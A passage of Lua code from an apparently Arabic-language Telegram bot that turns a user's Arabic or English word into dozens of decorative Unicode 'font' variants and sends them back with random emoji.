local zakrf = text:match("(.*)")  
botx1:del(BOT.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_)     
if not text:find('[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]') then 
bot = zakrf 
local font_base = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local font_hash = "ض,ص,ق,ف,غ,ع,ه,خ,ح,ج,ش,س,ی,ب,ل,ا,ن,ت,م,چ,ظ,ط,ز,ر,د,پ,و,ک,گ,ث,ژ,ذ,آ,ئ,.,_"  
local fonts = {      "ضـٍہًہ,صًـٍـًہ,ـᓆـ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,ـפֿـ,ـפـ,ج,ش,ـωـ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظٍـً,طہـۛ,ز,ر,ـב,پ,ـפּـ,ڪٰྀہٰٰٖـ,گـ,ثِْْہٰٰہٰٰہٰٰـ,ژ,ذَِِِْ,آ,ئ,.,_",      
"ضۜۜہٰٰ,صۛہُُِِٰٰۛہٰٰۛہٰٰ,قྀ̲ہٍٍٰٰٰٰٰྀ̲ہٰٰٰྀ̲ہٰٰٰ,ف͒ہِِٰٰٰٰ͒ہٰٰ͒ہٰٰ,غہِِِِٰٰٰٰہٰٰہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہّّٰٰٰ̐ہٰ̐ہ,حہٌٌٰٰٰٰہٰٰہٰٰ,جًًِِّّْْْۧۧۧ,شِٰہََُُِٰٰٰہِٰٰٰہٰٰ,سٌٌٍٍٰٰٰٰٰٰٓٓٓ,ی,بّہٌٌِِّٰٰہّہ,لْْٰٰ,آ,نَِٰہٍٍَِٰٰٰہَِٰہ,تَہََّّٰٰٰہََٰہَٰ,مٰ̲ہٍٍٰٰٰ̲ہٰ̲ہ,چ,ظۗہََِِْْٰٰۗہٰٰۗہٰٰ,طۨہََُُِِٰٰۨہٰٰۨہٰٰ,زًًَََََ,رِِٰٰ,دِِٰٰ,پ,وٍٍِِِّّ,ڪٰྀہٰٰٖ,گ,ثہِِْْْْٰٰہٰٰہٰٰ,ژ,ذََِِِْْ,ئ,آ,.,_",      
"ضــ,صــ,قــ,فــ,غــ,عــ,ـهــ,خــ,حــ,جــ,شــ, سـ,یــ,بــ,لــ,ﺂ,نــ,تــ,مــ,چــ,ظــ,طــ,ـز,ـر,ـد,پــ,ـو,کــ,گــ,ـثــ,ـژ,ـذ,ﺂ,ئ,.,_",        
"ضۜہٰٰ,صۛہٰٰ,قྀ̲ہٰٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہ,ٰ̲ھہ,خٰ̐ہ,حہٰٰ,جْۧ,شِٰہٰٰ,سٰٰٓ,ی,بّہ,ل,آ,نَِٰہ,تَہَٰ,مٰ̲ہ,چ,ظۗہٰٰ,طۨہٰٰ,زَ,ر,د,پ,وِ,ک,گ,ثہٰٰ,ژ,ذِ,ئ,آ,.,_",      
"ضًً,صــَ,ق,ف,غً,عـًً,هہـ,خِہ,ـحّ,جــٌ,ڜ,سُُُُُ,ی,بــِ,لـ,أ,نــہٰ⇣ـ,ِِتً,مہـً,چ,ظـَ,ط,ز,ر,د,پ,وُ,ﮏ,گ,ثـ͜͡ہــِ,ژ,ذ,ئ,أ  ,.,_",      
"ضًـٍـًہًـٍـًہ,صًـٍـًہ,ق,ف,غً,عً,هہـ,خِہ,ב,,جـﮩ๋͜ﮧـ͜ާْ,ڜـ͜ާ,سـّــً,ی,بہ,لـﮩﮨہٰٰہٰ,أ,טּ,تہٍِۣـّ̐ہٰ,مہ,چ,ظٍـًہ,ط,ز,ر,د,پ,وُ,ڪـ,گ,ثہـٰ̲ہٰٰ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غـ͜ﮩ͞ـ,عـ͜ﮩ͞ـ,هہـۛ,خہـۛ,ﺣہـۛ,جہـۛ,شۖہـۛ,سۜہـۛ,ی,بـ,ل,اآ,نہـۛ,تـ͜ﮩ͞ـ,مہـۛ,چ,ظـ͜ـ,طہـۛ,ز,ر,د,پ,ؤ,كـ͜ﮩ,گ,ثۨہـۛ,ژ,ذ,ئ,اآ  ,.,_",      
"ضـ͜,صـ,ق,فـ͜ـ,غہۛـۛ,عۛـۛ,ه๋͜‏ـ,خ,ح,ج,شـ͜ﮩ͞ـ,سـ͜ﮩ͞ـ,ی,ﯧـۛ,لـۛ,اآ,نـ͜ـ,ت,م͜͞ـ,چ,ظـۛ,ط๋͜‏ـ,ز,ر,د,پ,وُ,كـهـۛ,گ,ث,ژ,ذ,ئ,اآ  ,.,_",      
"ض๋͜‏ـۣۛ,صـ๋͜‏ـۣۛ,قـ,فـ๋͜‏ـۣۛ,غـ๋͜‏ـۣۛـ,عـ๋͜‏ـ,ه,خـ๋͜‏ـۣ,حـ๋͜‏ـ,,جـ๋͜‏ـ,شـ๋͜‏ـ,سـ๋͜‏ـ,ی,بہ,ل,أ,ن,تـ๋͜‏ـ,م,چ,ظـ๋͜‏ـ,ط,ز,ر,د,پ,و,كـ๋͜‏ـ,گ,ثہ,ژ,ذ,ئ,أ  ,.,_",      
"ض,ص,ق,ف,غ,ع,هـ͜ﮩ͞ـ,خ,ح,ج,ش,س,ی,ب,لـّﮩ๋͜‏ـ,آ,نہٰٰ,ྀ̲تہٰٰ,مـّﮩ๋͜‏ـ,چ,طـྀ̲͜ہٰٰ,طـ͜ﮩ͞ـ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صۛہٰٰ,قྀ̲ہٰٰ,ف͒ہٰٰ,غہٰٰ,؏ۤـہٰٰ,ھہ,خٰ̐ہ,حہٰٰ,جْہ,شِٰہٰٰ,سٰٓہ,ی,بہٰٰ,لྀ̲ہٰٰ,آ,نہٰٰ,ྀ̲تہٰٰ,םـۂ,چ,ظہٰٰྀ̲,طہٰٰ,ڒ,ـﺭْ,دۛ,پ,ﯢ,ڪ,گ,ثྀ̲ہٰٰ,ژ,ﺫ,ئ,آ  ,.,_",      
"ض,صـﮩ๋͜‏ـ,قـﮩ๋͜‏ـ,فـﮩ๋͜‏ـ,غـﮩ๋͜‏ـ,؏ـﮩ๋͜‏ـ,هـﮩ๋͜‏ـ,خـﮩ๋͜‏ـ,حـﮩ๋͜‏ـ,جـﮩ๋͜‏ـ,شـﮩ๋͜‏ـ,سـﮩ๋͜‏ـ,ی,بـﮩ๋͜‏ـ,لّۣۗ,آِ,نْۛ,تٌۙ,ﻡِۙـ,چ,ظـﮩ๋͜‏ـۖۜ,طٌۗ,ﺯۖ,ږۙ,ڊْ,پ,ﯠۚ,ڪٌۘ,گ,ثٌّۜ,ژ,ﺫۗ,ئ,آِ  ,.,_",      
"ض,صـ᷈͟ـ,قـ᷈͟ـ,فـ᷈͟ـ,غـ᷈͟ـ,عـ᷈͟ـ,هـ᷈͟ـ,خـ᷈͟ـ,حـ᷈͟ـ,جـ᷈͟ـ,شـ᷈͟ـ,سـ᷈͟ـ,ی,بـ᷈͟ـ,لـ᷈͟ـ,ٲآٲ,نـ᷈͟ـ,تـ᷈͟ـ,مـ᷈͟ـ,چ,ظـ᷈͟ــ᷈͟ـ,طـ᷈͟ـ,ز,ر,د,پ,ﯠ,كـ᷈͟ـ,گ,ثـ᷈͟ـ,ژ,ذ,ئ,ٲآٲ  ,.,_",      
"ض,صـﮩ⃑ﮩ,قـﮩ⃑ﮩ,فـﮩ⃑ﮩ,غـﮩ⃑ﮩ,عـﮩ⃑ﮩ,هـﮩ⃑ﮩ,خـﮩ⃑ﮩ,حـﮩ⃑ﮩ,جـﮩ⃑ﮩ,شـﮩ⃑ﮩ,سـﮩ⃑ﮩ,ی,بـﮩ⃑ﮩ,لـﮩ⃑ﮩ,آ,نـﮩ⃑ﮩ,تـﮩ⃑ﮩ,مـﮩ⃑ﮩ,چ,ظـﮩ⃑ﮩـﮩ⃑ﮩ,طـﮩ⃑ﮩ,ڒ,ر,ډ,پ,ﯛ,كـﮩ⃑ﮩ,گ,ثـﮩ⃑ﮩ,ژ,ﮈ,ئ,آ  ,.,_",      
"ضًـٍـًہ,صًـ,ـقـ,ف,غً,عًـ,هہ,خِہ,حـ,جْـ,ڜـ,ڛً,ی,بہ,ل,آ,ہن,تہ,م,چ,ظٍـً,طٍـًہ,ز,ڑ,دٍ,پ,وُ,ـڪـ,گ,ثـ,ژ,ذٍ,ئ,آ  ,.,_",      
"ضہۣۗ,صہۣۗ,قَہۣۗـ,فُہۣۗ,غّہۣۗ,عَہۣۗ,هہۣۗ,خٌہۣۗ,حًہۣۗ,جَہۣۗ,شّہۣۗ,سہۣۗـ,ی,بّہۣۗـ,لًً,أ,نٌہۣۗـ,تُہۣۗ,مہۣۗ,چ,ظٌہۣۗ,طٌہۣۗـ,زُ,رُ,دُ,پ,وِ,كہۣۗ,گ,ثًہۣۗ,ژ,ذٌ,ئ,أ  ,.,_",      
"ض,صۭۣۣۖـ,قۭۣۣۖـ,فۭۣۣۖـ,غۭۣۣۖـ,غۭۣۣۖـ,هۭۣۣۖـ,خۭۣۣۖـ,حۭۣۣۖـ,جۭۣۣۖـ,شۭۣۣۖـ,سۭۣۣۖـ,ی,بۭۣۣۖـ,لۭۣۣۖـ,آ,نۭۣۣۖـ,تۭۣۣۖـ,مۭۣۣۖـ,چ,ظۭۣۣۖـۭۣۣۖـ,طۭۣۣۖـ,ز,ر,د,پ,ﯠ,كۭۣۣۖـ,گ,ثۭۣۣۖـ,ژ,ذ,ئ,آ  ,.,_",      
"ض,صـﮩـ,قـﮩـ,فـﮩـ,غـﮩـ,عـﮩـ,هـﮩـ,خـﮩـ,حـﮩـ,جـﮩـ,شـﮩـ,سـﮩـ,ی,بـﮩـ,لـﮩـ,ٲ,نـﮩـ,تـﮩـ,مـﮩـ,چ,ظـﮩــﮩـ,طـﮩـ,ز,ر,د,پ,و,ګ,گ,ثـﮩـ,ژ,ذ,ئ,ٲ,.,_",      
"ض,صـٰٰـۛۛۛ,قـٰٰـۛۛۛ,فـٰٰـۛۛۛ,غـٰٰـۛۛۛ,عـٰٰـۛۛۛ,هـٰٰـۛۛۛ,خـٰٰـۛۛۛ,حـٰٰـۛۛۛ,جـٰٰـۛۛۛ,شـٰٰـۛۛۛ,سـٰٰـۛۛۛ,ی,بـٰٰـۛۛۛ,لـٰٰـۛۛۛ,أ,نـٰٰـۛۛۛ,تـٰٰـۛۛۛ,مـٰٰـۛۛۛ,چ,ظـٰٰـۛۛۛـٰٰـۛۛۛ,طـٰٰـۛۛۛ,ز,ر,د,پ,و,ک,گ,ثـٰٰـۛۛۛ,ژ,ذ,ئ,أ  ,.,_",      
"ض,صـٰ۫ﹻ,قـٰ۫ﹻ,فـٰ۫ﹻ,غـٰ۫ﹻ,عـٰ۫ﹻ,هـٰ۫ﹻ,خـٰ۫ﹻ,حـٰ۫ﹻ,جـٰ۫ﹻ,شـٰ۫ﹻ,سـٰ۫ﹻ,ی,بـٰ۫ﹻ,لـٰ۫ﹻ,ٱ,نَـٰ۫ﹻ,تْـٰ۫ﹻ,مٌـٰ۫ﹻ,چ,ظٌـٰ۫ﹻـٰ۫ﹻ,طِـٰ۫ﹻ,زُ,رَ,دِ,پ,وَ,كِـٰ۫ﹻ,گ,ثُـٰ۫ﹻ,ژ,ذَ,ئ,ٱℓ  ,.,_",      
"ض,صہٰـ͢͡,قہٰـ͢͡,فہٰـ͢͡,غہٰـ͢͡,عہٰـ͢͡,هہٰـ͢͡,خہٰـ͢͡,حہٰـ͢͡,جہٰـ͢͡,شہٰـ͢͡,سہٰـ͢͡,ی,بہٰـ͢͡,لہٰـ͢͡,ا,نہٰـ͢͡,تہٰـ͢͡,مہٰـ͢͡,چ,ظہٰـ͢͡ہٰـ͢͡,طہٰـ͢͡,ز,ر,د,پ,و,كہٰـ͢͡,گ,ثہٰـ͢͡,ژ,ذ,ئ,ا  ,.,_",       }  
local result = {}   
i=0  
for k=1,#fonts do   
i=i+1   
local tar_font = fonts[i]:split(",")   
local text = bot   
local text = text:gsub("ض",tar_font[1])     
local text = text:gsub("ص",tar_font[2])     
local text = text:gsub("ق",tar_font[3])     
local text = text:gsub("ف",tar_font[4])     
local text = text:gsub("غ",tar_font[5])     
local text = text:gsub("ع",tar_font[6])     
local text = text:gsub("ه",tar_font[7])     
local text = text:gsub("خ",tar_font[8])     
local text = text:gsub("ح",tar_font[9])     
local text = text:gsub("ج",tar_font[10])     
local text = text:gsub("ش",tar_font[11])     
local text = text:gsub("س",tar_font[12])     
local text = text:gsub("ی",tar_font[13])     
local text = text:gsub("ب",tar_font[14])     
local text = text:gsub("ل",tar_font[15])     
local text = text:gsub("ا",tar_font[16])     
local text = text:gsub("ن",tar_font[17])     
local text = text:gsub("ت",tar_font[18])     
local text = text:gsub("م",tar_font[19])     
local text = text:gsub("چ",tar_font[20])     
local text = text:gsub("ظ",tar_font[21])     
local text = text:gsub("ط",tar_font[22])     
local text = text:gsub("ز",tar_font[23])     
local text = text:gsub("ر",tar_font[24])     
local text = text:gsub("د",tar_font[25])    
local text = text:gsub("پ",tar_font[26])     
local text = text:gsub("و",tar_font[27])     
local text = text:gsub("ک",tar_font[28])     
local text = text:gsub("گ",tar_font[29])     
local text = text:gsub("ث",tar_font[30])     
local text = text:gsub("ژ",tar_font[31])     
local text = text:gsub("ذ",tar_font[32])     
local text = text:gsub("ئ",tar_font[33])     
local text = text:gsub("آ",tar_font[34])      
table.insert(result, text)   
end   
local bot22 = "🌿⁞ الكلمه "..bot.." •\n🍄⁞ تم زخرفتها {"..tostring(#fonts).."} نوع •\n✨⁞ اضغط على الكلمه لنسخها •\n\n"
number=0   
for v=1,#result do  
number=number+1   
local bot = { ' •🔥✨ ', '🔅🔥﴿', '•  ❥˓  ', '💝﴿ֆ', ' • 🐼🌿', ' •🙊💙', '-🐥✨ ', ' 〄😻‘',' ⚡️', '- ⁽🌷', '🔥“', '💭', '', '🎩🍿','“̯ 🐼💗 ', '🐝🍷','❥̚͢₎ 🐣', '👄‘', ' 💭ۦ', ' 💛💭ۦ', ' ⚡️ۦ','℡ᴖ̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ ✨🐯⇣✦', '⁞♩⁽💎🌩₎⇣✿','ۦٰ‏┋❥ ͢˓🦁💛ۦ‏', '⚡️♛ֆ₎', '♛⇣🐰☄️₎✦', '⁾⇣✿💖┊❥', ' ₎✿🎃 ⁞“❥', '😴✿⇣', '❥┊⁽ ℡🦁' }   
bot22 = bot22..''..number.." • `"..result[number]..''..bot[math.random(#bot)].."`\n\n"    
end  
botdx(msg.chat_id_, 0, 1, bot22, 1, 'md') 
end 
end 
if botx1:get(BOT.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then       
local zakrf = text:match("(.*)")       
botx1:del(BOT.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_)         
if not text:find("[\216-\219][\128-\191]") then      
bot = zakrf     
local font_base = "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,9,8,7,6,5,4,3,2,1,.,_"     
local font_hash = "z,y,x,w,v,u,t,s,r,q,p,o,n,m,l,k,j,i,h,g,f,e,d,c,b,a,Z,Y,X,W,V,U,T,S,R,Q,P,O,N,M,L,K,J,I,H,G,F,E,D,C,B,A,0,1,2,3,4,5,6,7,8,9,.,_"     
local fonts = {            "Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,Ꭿ,Ᏸ,Ꮸ,Ꭰ,Ꭼ,Ꮀ,Ꮆ,Ꮋ,Ꭵ,Ꭻ,Ꮶ,Ꮮ,Ꮇ,Ꮑ,Ꮻ,Ꮲ,Ꮕ,Ꭱ,Ꮪ,Ꮏ,Ꮜ,Ꮙ,Ꮤ,Ꮉ,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,Ǻ,฿,₡,Đ,Є,ƒ,Ģ,Ħ,Ĩ,j,k,ℓ,₥,ŋ,Ǿ,ṕ,գ,Г,Ŝ,Ṫ,ษ,Ṽ,ฟ,Ẍ,ץ,Ẕ,0,9,8,7,6,5,4,3,2,1  ,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ,Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ,u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,9,8,7,6,5,4,3,2,1,.,_",     
"п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐,к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,п̵̐,в̷̐,ċ̷̐,d̷̐,є̷̐,г̵̵,j̵̐,н̷̐,ɪ̇̐,j̵̐к̷̐,ℓ̷̐,м̷̐,л̷̐,σ̷̐,ρ̷̐,q̷̐,я̷̐,ѕ̷̐,τ̷̐,υ̷̐,ν̷̐,ω̷̐,x̷̐,у̷̐,z̷̐,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,ᴬ,ᴮ,ᶜ,ᴰ,ᴱ,ᶠ,ᴳ,ᴴ,ᴵ,ᴶ,ᴷ,ᴸ,ᴹ,ᴺ,ᴼ,ᴾ,ᵟ,ᴿ,ˢ,ᵀ,ᵁ,ᵛ,ᵂ,ˣ,ᵞ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,Ꮧ,Ᏸ,ፈ,Ꮄ,Ꮛ,Ꭶ,Ꮆ,Ꮒ,Ꭵ,Ꮰ,Ꮶ,Ꮭ,Ꮇ,Ꮑ,Ꭷ,Ꭾ,Ꭴ,Ꮢ,Ꮥ,Ꮦ,Ꮼ,Ꮙ,Ꮗ,ጀ,Ꭹ,ፚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙۪۪,卂۪۪,乃۪۪,匚۪۪,ᗪ۪۪,乇۪۪,千۪۪,Ꮆ۪۪,卄۪۪,丨۪۪,ﾌ۪۪,Ҝ۪۪,ㄥ۪۪,爪۪۪,几۪۪,ㄖ۪۪,卩۪۪,Ɋ۪۪,尺۪۪,丂۪۪,ㄒ۪۪,ㄩ۪۪,ᐯ۪۪,山۪۪,乂۪۪,ㄚ۪۪,乙,0,9,8,7,6,5,4,3,2,1,.,_",     
"ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,ؔ͜α,ؔ͜в,ؔ͜c,ؔ͜d,ؔ͜є,ؔ͜f,ؔ͜g,ؔ͜h,ؔ͜í,ؔ͜j,ؔ͜k,ؔ͜l,ؔ͜m,ؔ͜n,ؔ͜o,ؔ͜p,ؔ͜q,ؔ͜r,ؔ͜s,ؔ͜t,ؔ͜u,ؔ͜v,ؔ͜w,ؔ͜x,ؔ͜y,ؔ͜z,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,Ꭺ,b,Ꮯ,Ꭰ,Ꭼ,f,Ꮆ,h,Ꭵ,j,Ꮶ, Ꮮ,m,Ꮑ,Ꮎ,Ꮲ,q,Ꮢ,s,Ꮖ, u,Ꮙ,Ꮃ,x,Ꮍ,Ꮓ,0,Գ,Ց,Դ,6,5,Վ,Յ,Զ,1,.,_",     
"a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,a̷,b̷,c̷,d̷,e̷,f̷,g̷,h̷,i̷,j̷,k̷,l̷,m̷,n̷,o̷,p̷,q̷,r̷,s̷,t̷,u̷,v̷,w̷,x̷,y̷,z̷,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̲,̲B̲,̲C̲,̲D̲,̲E̲,̲F̲,̲G̲,̲H̲,̲I̲,̲J̲,̲K̲,̲L̲,̲M̲,̲N̲,̲O̲,̲P̲,̲Q̲,̲R̲,̲S̲,̲T̲,̲U̲,̲V̲,̲W̲,̲X̲,̲Y̲,̲Z̲,̲a̲,̲b̲,̲c̲,̲d̲,̲e̲,̲f̲,̲g̲,̲h̲,̲i̲,̲j̲,̲k̲,̲l̲,̲m̲,̲n̲,̲o̲,̲p̲,̲q̲,̲r̲,̲s̲,̲t̲,̲u̲,̲v̲,̲w̲,̲x̲,̲y̲,̲z̲,̲0̲,̲9̲,̲8̲,̲7̲,̲6̲,̲5̲,̲4̲,̲3̲,̲2̲,̲1̲,̲.̲,̲_̲",     
"Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,Λ,ß,Ƈ,D,Ɛ,F,Ɠ,Ĥ,Ī,Ĵ,Ҡ,Ŀ,M,И,σ,Ṗ,Ҩ,Ŕ,S,Ƭ,Ʊ,Ѵ,Ѡ,Ӿ,Y,Z,0,9,8,7,6,5,4,3,2,1,.,_",     
"A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆,K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,A̺͆,B̺͆,C̺͆,D̺͆,E̺͆,F̺͆,J̺͆,H̺͆,I̺͆,J̺͆K̺͆,L̺͆,M̺͆,N̺͆,O̺͆,P̺͆,Q̺͆,R̺͆,S̺͆,T̺͆,U̺͆,V̺͆,W̺͆,X̺͆,Y̺͆,Z̺͆,0,9,8,7,6,5,4,3,2,1,.,_",     
"۪۫a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,۪۫y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,a۪۪۪۫۫۫,۪۫b۪۪۪۫۫۫,۪۫c۪۪۪۫۫۫,۪۫d۪۪۪۫۫۫,۪۫e۪۪۪۫۫۫,۪۫f۪۪۪۫۫۫,۪۫g۪۪۪۫۫۫,۪۫h۪۪۪۫۫۫,۪۫i۪۪۪۫۫۫,۪۫j۪۪۪۫۫۫,۪۫k۪۪۪۫۫۫,۪۫l۪۪۪۫۫۫,۪۫m۪۪۪۫۫۫,۪۫n۪۪۪۫۫۫,۪۫o۪۪۪۫۫۫,۪۫p۪۪۪۫۫۫,۪۫q۪۪۪۫۫۫,۪۫r۪۪۪۫۫۫,۪۫s۪۪۪۫۫۫,۪۫t۪۪۪۫۫۫,۪۫u۪۪۪۫۫۫,۪۫v۪۪۪۫۫۫,۪۫w۪۪۪۫۫۫,۪۫x۪۪۪۫۫۫,y۪۪۪۫۫۫,۪۫z۪۪۪۫۫۫,۪۪۫۫,0۪۪۫۫,9۪۪۫۫,8۪۪۫۫,7۪۪۫۫,6۪۪۫۫,5۪۪۫۫,4۪۪۫۫,3۪۪۫۫,2۪۪۫۫,1۪۪۫۫,.۪۪۫۫,_",     
"͜͡Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,ؔؔ͜͜Ꮧ,͜͡Ᏸ,͜͡ፈ,͜͡Ꮄ,͜͡Ꮛ,͜͡Ꭶ,͜͡Ꮆ,͜͡Ꮒ,͜͡Ꭵ,͜͡Ꮰ,͜͡Ꮶ,͜͡Ꮭ,͜͡Ꮇ,͜͡Ꮑ,͜͡Ꭷ,͜͡Ꭾ,͜͡Ꭴ,͜͡Ꮢ,͜͡Ꮥ,͜͡Ꮦ,͜͡Ꮼ,͜͡Ꮙ,͜͡Ꮗ,͜͡ጀ,͜͡Ꭹ,͜͡ፚ,͜͡0,9,8,7,6,5,4,3,2,1,.,_",     
"A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,̶̶A̶̶,B̶̶,C̶̶,D̶̶,E̶̶,F̶̶,G̶̶,H̶̶,I̶̶,J̶̶,K̶̶,L̶̶,M̶̶,N̶̶,O̶̶,P̶̶,Q̶̶,R̶̶,S̶̶,T̶̶,U̶̶,V̶̶,W̶̶,X̶̶,Y̶̶,Z̶̶,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,ᗩ,ᙖ,ᑕ,ᗪ,ᕮ,ℱ,ᘐ,ᕼ,Ꭵ,ᒎ,Ḱ,ᒪ,ᙢ,ᘉ,〇,ᖘ,Ⴓ,ᖇ,ᔕ,ͳ,ᘮ,ᐯ,ᗯ,‏χ,ϒ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     
